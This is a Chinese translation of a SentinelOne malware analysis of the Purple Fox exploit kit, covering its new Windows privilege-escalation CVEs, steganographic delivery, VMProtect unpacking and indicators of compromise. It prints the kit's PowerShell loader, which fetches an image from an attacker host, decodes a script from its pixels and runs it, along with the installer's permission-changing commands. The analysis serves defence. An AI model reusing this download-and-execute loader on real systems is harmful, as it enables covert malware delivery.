**译者：知道创宇404实验室翻译组**  
**原文链接：<https://labs.sentinelone.com/purple-fox-ek-new-cves-steganography-and-virtualization-added-to-attack-flow/>**

### 摘要

  * 最近几周，攻击者利用Purple Fox攻击Internet Explorer的次数激增。
  * 我们的调查显示，Purple Fox利用了两个最新的CVEs—CVE-2020-1054和CVE-2019-0808。
  * 此外，我们还注意到他们的攻击流发生了变化，这使得他们能够更好地规避防火墙保护和一些检测工具，通过采用代码虚拟化技术隐藏恶意代码。

在过去的几年里，Purple
Fox改进了它的攻击方法。它于2018年9月被首次[观察](https://blog.360totalsecurity.com/en/purple-fox-trojan-burst-out-globally-and-infected-more-than-30000-users/
"观察")到，随后在[2019年放弃了使用NSIS](https://www.trendmicro.com/en_ca/research/19/i/purple-fox-fileless-malware-with-rookit-component-delivered-by-rig-exploit-kit-now-abuses-powershell.html "2019年放弃了使用NSIS")（Nullsoft Scriptable Install
System）和Rig攻击工具包的使用，转而采用PowerShell来实现无文件执行。今年早些时候，ProofPoint[详细介绍](https://www.proofpoint.com/us/blog/threat-insight/purple-fox-ek-adds-exploits-cve-2020-0674-and-cve-2019-1458-its-arsenal "详细介绍")了Purple
Fox是如何将CVE-2020-0674和CVE-2019-1458添加到武器库中的。我们的研究表明，攻击者添加了更多的CVE来实现权限提升，并且采用了隐写和虚拟化技术来避免检测和阻碍分析。

### 有效载荷

![](https://images.seebug.org/content/images/2020/10/b1546e78-7980-4ce6-9736-94ae7ca866c6.jpg-w331s)

在我们观察到的攻击中，受害者通过广告或仅通过单击错误的URL被引导到恶意网站。攻击者将其恶意软件托管在`speedjudgementacceleration[.]com`上，并将目标锁定在Internet
Explorer用户上。

该漏洞利用[VBScript代码作为命令行](https://lolbas-project.github.io/lolbas/Binaries/Mshta/#execute "VBScript代码作为命令行")运行mshta.exe
，然后运行PowerShell。PowerShell代码下载并执行下一阶段：`http[:]//rawcdn[.]githack[.]cyou/up.php?key=1`。

![](https://images.seebug.org/content/images/2020/10/d3f3d594-8943-427e-aea7-b924c32048f9.png-w331s)
图1：SentinelOne代理对攻击的自主检测

下一阶段遵循与以往版本的Purple Fox类似的模式。首先检查它是否以管理员权限运行。如果是，它将直接从攻击者的站点安装key =
2的MSI软件包。否则，它会尝试几种不同的本地权限升级漏洞来首先提升自身。

### 新权限升级漏洞

在最新版本的Purple Fox中，攻击者改进了两点。

过去，Purple
Fox会下载使用图像文件扩展名（update.jpg）的本地权限提升（LPE）二进制文件，但实际上它是一个常规的可执行文件。这种技术很容易被防火墙或安全软件检测为恶意。

现在，新版本的漏洞利用工具包将下载实际的映像文件（key = 3和key = 4），并使用隐写术将每个LPE嵌入映像中。所用图像之一的示例如下所示：

![](https://images.seebug.org/content/images/2020/10/0ae6377b-81f4-4db4-910a-bf6ba2359829.png-w331s)

下载后，这将被提取到内存中。运行并解码以下代码：

    
    
    $uyxQcl8XomEdJUJd='sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("http[:]//rawcdn[.]githack[.]cyou/up.php?key=3"));$o=a Byte[] 589824;(0..575)|%{foreach($x in(0..1023)){$p=$g.GetPixel($x,$_);$o[$_*1024+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..589362]))'
    IEX ($uyxQcl8XomEdJUJd)

此外，现在正在利用两个新漏洞来帮助提升本地权限：[CVE-2020-1054](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1054
"CVE-2020-1054")和[CVE-2019-0808](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0808
"CVE-2019-0808")。两者都是Win32k组件中的内核漏洞。CVE-2020-1054于今年5月进行了修补。我们发现的利用这些漏洞的攻击者二进制文件分别于2020年8月11日和2020年9月10日编译。

该漏洞利用程序包含调试信息和大量信息字符串。例如，CVE-2020-1054上的调试路径为：

    
    
    D:\Personal\Windows\Windows10\Desktop\CVE-2020-1054-master\CVE-2020-1054-master\x64\Release\CVE-2020-1054.pdb

该代码来自Git存储库，我们能够快速将漏洞利用追踪到以下公共存储库：[CVE-2020-1054](https://github.com/KaLendsi/CVE-2020-1054/blob/master/CVE-2020-1054/exploit.cpp
"CVE-2020-1054")，[CVE-2019-0808](https://github.com/DreamoneOnly/CVE-2019-0808-32-64-exp/blob/master/CVE-2019-0808/main.cpp
"CVE-2019-0808")。

不幸的是，到目前为止，在野外寻找更多具有类似特征的二进制文件至今没有结果。

值得注意的是，所有脚本都在`HKCU \ Software \
7-Zip`下检查名为“StayOnTop”的特定且一致的注册表值。似乎设置此值可使恶意软件确定有效负载是否成功运行。因此，在计算机的注册表中找到该值表明Purple
Fox做出了让步。

### Rootkit有效负载

PowerShell脚本和权限升级利用的目的是在计算机上安装rootkit。我们在新域中找到了两个版本的恶意软件，它们都是rootkit的MSI安装程序。其中一个文件丢失了。但是，我们在进行完整文件的分析时[发现了一些惊喜](https://www.virustotal.com/gui/file/9208e853d6de61f1640822ae723e0d40730e29cef5a660419b95fd32c84c9ade/details
"发现了一些惊喜")。

安装过程大致相同。重启后，我们仍然看到使用[PendingFileRenameOperations](https://qtechbabble.wordpress.com/2020/06/26/use-pendingfilerenameoperations-registry-key-to-automatically-delete-a-file-on-reboot/
"PendingFileRenameOperations")将文件放置在目录下system32。但是，MSI软件包中的[CustomAction表](https://docs.microsoft.com/en-us/windows/win32/msi/customaction-table
"CustomAction表")具有vbscript代码，该代码除其他外运行以下命令：

    
    
    vbs.Run "takeown /f %windir%\system32\jscript.dll",0,True
    vbs.Run "cacls %windir%\system32\jscript.dll /E /P everyone:N",0,True
    vbs.Run "takeown /f %windir%\syswow64\jscript.dll",0,True
    vbs.Run "cacls %windir%\syswow64\jscript.dll /E /P everyone:N",0,True
    vbs.Run "takeown /f %windir%\system32\cscript.exe",0,True
    vbs.Run "cacls %windir%\system32\cscript.exe /E /P everyone:N",0,True
    vbs.Run "takeown /f %windir%\syswow64\cscript.exe",0,True
    vbs.Run "cacls %windir%\syswow64\cscript.exe /E /P everyone:N",0,True
    vbs.Run "powershell Start-Sleep -Seconds 900; Restart-Computer -Force",0,false

有趣的是，这些命令直接来自Microsoft的咨询，内容涉及如何防御CVE-2020-0674漏洞（Internet Explorer
RCE），Purple Fox使用此漏洞获得了初始访问权限。我们推测保护新感染的计算机不受该漏洞的影响可能是为了阻止竞争对手。

从MSI软件包中提取恶意软件后，我们注意到有效负载还具有一项重要的新功能：受[VMProtect保护](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/ADV200001 "VMProtect保护")。

从PE的分区表中可以轻松观察到VMProtect的使用：

![](https://images.seebug.org/content/images/2020/10/525e10c8-7863-40aa-a528-72efda923377.png-w331s)
图2：“.vmp%d”部分的入口点清楚地表明了VMProtect

这使得反转变得更加困难，因为它使用了许多技术来隐藏原始代码并对其进行模糊处理。

### Unpacking VMProtect

反转VMProtected二进制文件时，有两个主要障碍需要克服：打包数据和虚拟指令。

我们首先必须解压缩二进制文件中的数据。为此，我们使用[x64dbg](https://x64dbg.com/
"x64dbg")打开了文件。之后，我们在VirtualProtect函数的开始处放置一个断点。

![](https://images.seebug.org/content/images/2020/10/69ab06b4-feb4-45a7-be53-2fa73c43d215.png-w331s)

我们想要记录对该函数的所有调用，因此我们在“Log Text”框中输入：`VirtualProtect: lpAddress={a:[esp+4]},
dwSize={d:[esp+8]}, flNewProtect={x:[esp+C]} ;`

运行它直到崩溃，将产生以下输出：

    
    
    VirtualProtect: lpAddress=x86_pf.00401000, dwSize=153444, flNewProtect=40 ;
    PAGE_EXECUTE_READWRITE
    VirtualProtect: lpAddress=x86_pf.00427000, dwSize=1032, flNewProtect=40 ;
    PAGE_EXECUTE_READWRITE
    VirtualProtect: lpAddress=x86_pf.0047D000, dwSize=76, flNewProtect=4 ;
    VirtualProtect: lpAddress=x86_pf.0047E000, dwSize=68, flNewProtect=4 ;
    VirtualProtect: lpAddress=x86_pf.00401000, dwSize=153444, flNewProtect=20 ;
    PAGE_EXECUTE_READ 
    VirtualProtect: lpAddress="ƒ-", dwSize=1032, flNewProtect=20 ;
    VirtualProtect: lpAddress=x86_pf.0047D000, dwSize=76, flNewProtect=2 ;

我们可以看到数据可能已经解压缩到虚拟地址0x401000，因此我们将要监视该地址，直到将数据写入该地址为止。

重新启动程序后，我们再次在VirtualProtect上放置一个断点，并使该断点命中八次。然后，我们将EIP设置为该地址，并使用x64dbg的内置Scylla插件转储二进制文件并修复其导入：

这为我们提供了一个更小的、可调试的DLL文件，其中包含大量纯文本字符串，以帮助我们调查恶意软件。

DLL的代码仍使用[虚拟化的调用](https://oreans.com/CodeVirtualizer.php
"虚拟化的调用")进行了模糊处理，但幸运的是，我们在字符串中找到了这一点：

    
    
    Hid_State
    Hid_StealthMode
    Hid_HideFsDirs
    Hid_HideFsFiles
    Hid_HideRegKeys
    Hid_HideRegValues
    Hid_IgnoredImages
    Hid_ProtectedImages

这与之前报道的rootkit版本类似，这只是他们下载和编译的一个公共rootkit。从这些信息中，我们推断他们还没有实质性地升级rootkit中的功能。

### 结论

Purple
Fox工具正在积极开发中。自2018年9月以来，我们研究发现，攻击者正在追踪Microsoft补丁程序，以利用那些未能及时修补的漏洞。这种新的变体通过隐藏LPE二进制文件来提高其逃避检测的能力，并利用可商购的软件来保护其代码免受分析。

### IOC

**SHA1**

c82fe9c9fdd61e1e677fe4c497be2e7908476d64 CVE-2019-1458.exe  
e43f98c0698551f997649c75a2bfe988f72060c0 CVE-2020-1054.exe  
82af45d8c057ef0cf1a61cc43290d21f37838dd1 cve_2019_0808.exe  
6cac8138f1e7e64884494eff2b01c7b1df83aef2 rootkit_from_cve_2019_0808.msi  
e65c1a74275e7099347cbec3f9969f783d6f4f7d cve_2019_0808.ps1  
bdeed6792463713806f39c3b5abc0d56f176e88f key1.bin  
921d1beb3c48b03e20ba1ea07ea1c8f8fc97ec8e key2.bin  
2c5c07c969dd715d0e696f8a8e9e6754a9114d4e key3.bin  
5a680f659c91870a819ede06746f21282a4929d1 key4.bin  
60f2624c39f61ec6c2eff09d463ca57d9a227b9b key5.bin  
bd00f0e6e8cbe0b486fe0aad9e6e38ea606f7044 key6.bin  
9ba5e84fccf1012343ba72e9584c6af3beb8b361 key7.bin  
57b4eac452c2e8c73222d0915a97a63b43d391de key8.bin  
57b4eac452c2e8c73222d0915a97a63b43d391de key9.bin  
c21b1397d25ece8221e981eb5289c592f71ab4ca rootkit_encrypted_payload  
0470d80daf464b5ea5ee80e2db18e0582f6dbfaf rootkit_x86  
bc9766d405913a6162d3747a5a7d0afe1857ac88 rootkit_x64

**SHA256**

079c13fbc30a32e4f0386cd53c56d68404961b8f1cd4d4fde1a1e9def42aa557
CVE-2019-1458.exe  
7465b738ba31fa2fff7fef1d770ef32e43b01d49a937b3b1c11dc2e4e45fd019
CVE-2020-1054.exe  
babfd8e70102479dea4f239c1ee5de463af07c73a94592b390257c5b3d2878a9
cve_2019_0808.exe  
9208e853d6de61f1640822ae723e0d40730e29cef5a660419b95fd32c84c9ade
rootkit_from_cve_2019_0808.msi  
e30d7375f5f88847b810755f0a2cda82e8eeb084a3b989c85d6f13f6a1c01f38
cve_2019_0808.ps1  
b48c61983f2d453d4d6a5ff1f2c9e0e194d7ae892a2649d7bafd267082033748 key1.bin  
49d9f5aaeb6fd10d371afbebf33ffed184b22e66350a12a60cbbe34ff1fadf9e key2.bin  
8392f7bc7bd93ab035e609619e0915b7e8c91288fc6eb19237c0e2019f8dcaa2 key3.bin  
13b0e2769d7a0b3964c4e491f90fc4518f8e5ae4d8c37082ffe764b3a174e9a7 key4.bin  
6bee844cdd424c970ff8bba22385ae4c1ae51c2b4e036ba1a217ba37e100530f key5.bin  
e49327a62e4500ac23fa0b506c565350fbc9afd497198a8b4b8ae8f537146d53 key6.bin  
321eeafe6a9dbd424bf9fdf7ded1ef18c7cab68fadb58cd0da5a1c74479a509f key7.bin  
01662ffa9a1c637307e1d148ac2492c69d6035ca87424cbb11e44a178002abc4 key8.bin  
01662ffa9a1c637307e1d148ac2492c69d6035ca87424cbb11e44a178002abc4 key9.bin  
cfae7a1935f0aaf0f76322f29ad0e0fd1a77d325e55fa324a0bb19e264760800
rootkit_encrypted_payload  
181551603ebebbf5924247212c0ed93b6c9c4b088e612bf04f5996c227563318 rootkit_x86  
1209aece1f9f54e6422083791eb8a59df878f6959beae9e53736e3056459ab1e rootkit_x64

**Domains**

speedjudgmentacceleration[.]com  
rawcdn[.]githack[.]cyou  
dl[.]gblga[.]workers.dev  
dl[.]fmhsi[.]workers.dev

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1376/>

